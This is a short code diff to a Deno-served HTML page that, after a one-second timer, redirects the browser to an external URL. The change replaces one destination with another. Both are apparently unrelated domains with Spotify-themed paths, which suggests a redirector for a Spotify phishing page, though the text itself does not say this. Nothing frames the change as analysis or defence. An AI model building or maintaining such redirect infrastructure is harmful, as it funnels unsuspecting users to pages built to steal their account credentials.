@@ -7,7 +7,7 @@ Deno.serve(() => {
 <title>Redirecting...</title>
 <script>
 setTimeout(() => {
-    window.location.href = "https://www.krishhomestudios.com/spt/web/cd.php";
+    window.location.href = "https://goat-ae.com/SPT/Spotify-2/Spotify-2";
 }, 1000);
 </script>
 </head>
